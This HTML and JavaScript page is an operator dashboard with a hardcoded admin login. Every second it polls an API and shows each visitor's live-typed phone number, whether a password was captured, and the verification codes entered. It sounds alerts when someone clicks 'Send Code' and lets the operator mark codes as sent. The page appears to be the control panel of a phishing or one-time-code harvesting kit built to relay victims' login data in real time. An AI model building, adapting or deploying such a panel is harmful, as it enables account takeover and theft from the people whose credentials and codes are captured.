<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Dashboard</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0b1120;
      color: #f8fafc;
      margin: 0;
      padding: 20px;
    }
    .login-box {
      max-width: 360px;
      margin: 80px auto;
      background: #1e293b;
      padding: 24px;
      border-radius: 12px;
    }
    .login-box input {
      width: 100%;
      padding: 10px;
      margin-bottom: 12px;
      border-radius: 8px;
      border: 1px solid #334155;
      background: #0f172a;
      color: #fff;
      box-sizing: border-box;
    }
    .login-box button {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 8px;
      background: #2563eb;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
    }
    .hidden { display: none; }
    .new-user-banner {
      background: #065f46;
      border: 1px solid #10b981;
      color: #ecfdf5;
      padding: 12px 16px;
      border-radius: 10px;
      margin-bottom: 16px;
      font-weight: bold;
      display: none;
    }
    .user-card {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 12px;
      padding: 16px;
      margin-bottom: 14px;
    }
    .live-phone {
      font-size: 22px;
      font-weight: bold;
      color: #4ade80;
      letter-spacing: 1px;
    }
    .alert-badge {
      display: inline-block;
      background: #f59e0b;
      color: #000;
      font-weight: bold;
      padding: 4px 10px;
      border-radius: 999px;
      font-size: 13px;
      margin-top: 8px;
    }
    .thumbs-btn {
      font-size: 22px;
      padding: 6px 14px;
      border-radius: 8px;
      border: none;
      background: #16a34a;
      color: #fff;
      cursor: pointer;
      margin-left: 8px;
    }
    .del-btn {
      padding: 6px 12px;
      border-radius: 8px;
      border: none;
      background: #dc2626;
      color: #fff;
      cursor: pointer;
      margin-left: 8px;
    }
    .code-rows {
      display: flex;
      flex-direction: column;
      gap: 8px;
      margin-top: 12px;
    }
    .code-row-item {
      background: #0f172a;
      border: 1px solid #475569;
      padding: 9px 14px;
      border-radius: 8px;
      font-size: 15px;
      font-weight: bold;
      color: #e2e8f0;
    }
  </style>
</head>
<body>
  <div id="loginSection" class="login-box">
    <h2>Admin Login</h2>
    <input type="email" id="emailInput" placeholder="Email" />
    <input type="password" id="passwordInput" placeholder="Password" />
    <button id="loginBtn">Login</button>
    <p id="loginError" style="color:#f87171;"></p>
  </div>

  <div id="dashboardSection" class="hidden">
    <h2>Live User Monitor (1s Auto-Refresh)</h2>
    <div id="newUserBanner" class="new-user-banner"></div>
    <div id="usersContainer"></div>
  </div>

  <script>
    const ADMIN_EMAIL = 'admin@example.com';
    const ADMIN_PASSWORD = 'admin123';

    const loginSection = document.getElementById('loginSection');
    const dashboardSection = document.getElementById('dashboardSection');
    const loginBtn = document.getElementById('loginBtn');
    const loginError = document.getElementById('loginError');
    const newUserBanner = document.getElementById('newUserBanner');
    const usersContainer = document.getElementById('usersContainer');

    let isLoggedIn = false;
    let seenAlertIds = new Set();
    let bannerTimeout = null;

    function escapeHtml(value) {
      return String(value ?? '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
    }

    function playAlertBeep() {
      try {
        const AudioCtx = window.AudioContext || window.webkitAudioContext;
        if (!AudioCtx) return;
        const ctx = new AudioCtx();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'sine';
        osc.frequency.value = 880;
        gain.gain.value = 0.08;
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start();
        setTimeout(() => {
          osc.stop();
          ctx.close();
        }, 180);
      } catch (e) {}
    }

    function showNewUserNotification(message) {
      newUserBanner.textContent = `🔔 ${message}`;
      newUserBanner.style.display = 'block';
      playAlertBeep();

      if ('Notification' in window && Notification.permission === 'granted') {
        new Notification('New User Phone Typing', { body: message });
      }

      clearTimeout(bannerTimeout);
      bannerTimeout = setTimeout(() => {
        newUserBanner.style.display = 'none';
      }, 6000);
    }

    loginBtn.addEventListener('click', () => {
      const email = document.getElementById('emailInput').value.trim();
      const pass = document.getElementById('passwordInput').value;
      if (email === ADMIN_EMAIL && pass === ADMIN_PASSWORD) {
        isLoggedIn = true;
        loginSection.classList.add('hidden');
        dashboardSection.classList.remove('hidden');
        if ('Notification' in window && Notification.permission === 'default') {
          Notification.requestPermission().catch(() => {});
        }
        fetchLiveData();
      } else {
        loginError.textContent = 'Invalid email or password';
      }
    });

    window.sendThumbsUp = async function(sessionId) {
      await fetch('/api/admin/mark-code-sended', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId })
      });
      fetchLiveData();
    };

    window.deleteSession = async function(sessionId) {
      await fetch(`/api/sessions/${encodeURIComponent(sessionId)}`, {
        method: 'DELETE'
      });
      fetchLiveData();
    };

    function handleAlerts(alerts) {
      if (!Array.isArray(alerts)) return;
      for (const alert of alerts) {
        if (alert && alert.id && !seenAlertIds.has(alert.id)) {
          seenAlertIds.add(alert.id);
          showNewUserNotification(alert.message || `Naya user phone enter kar raha hai: ${alert.phone || ''}`);
        }
      }
    }

    async function fetchLiveData() {
      if (!isLoggedIn) return;
      try {
        const res = await fetch('/api/submissions');
        if (!res.ok) return;
        const data = await res.json();
        handleAlerts(data.alerts || []);
        renderUsers(data.sessions || [], data.groupedCodes || {});
      } catch (e) {}
    }

    function renderUsers(sessions, groupedCodes) {
      if (!sessions.length) {
        usersContainer.innerHTML = '<p>Abhi koi live user data nahi hai.</p>';
        return;
      }

      usersContainer.innerHTML = sessions.map(s => {
        const safeSessionId = escapeHtml(s.sessionId);
        const safePhone = escapeHtml(s.phone || '-');
        const codes = groupedCodes[s.phone] || [null, null, null];

        const rowsHtml = [0, 1, 2].map(idx => {
          const val = codes[idx] ? escapeHtml(codes[idx]) : '-';
          return `<div class="code-row-item">${idx + 1} digit code-${val}</div>`;
        }).join('');

        const statusBlock = s.codeRequested
          ? `<div class="alert-badge">🔔 User ne "Send Code" click kiya hai!</div>
             <button class="thumbs-btn" title="Mark code sended" onclick="sendThumbsUp('${safeSessionId}')">👍</button>`
          : s.codeSended
            ? `<div style="color:#38bdf8; margin-top:8px;">✔ "code sended" bhej diya gaya</div>`
            : '';

        return `
          <div class="user-card">
            <div>Live Phone: <span class="live-phone">${safePhone}</span></div>
            <div>Password: <span>${s.password ? '••••••' : '-'}</span></div>
            ${statusBlock}
            <button class="del-btn" onclick="deleteSession('${safeSessionId}')">Delete</button>
            <div class="code-rows">${rowsHtml}</div>
          </div>
        `;
      }).join('');
    }

    setInterval(fetchLiveData, 1000);
  </script>
</body>
</html>
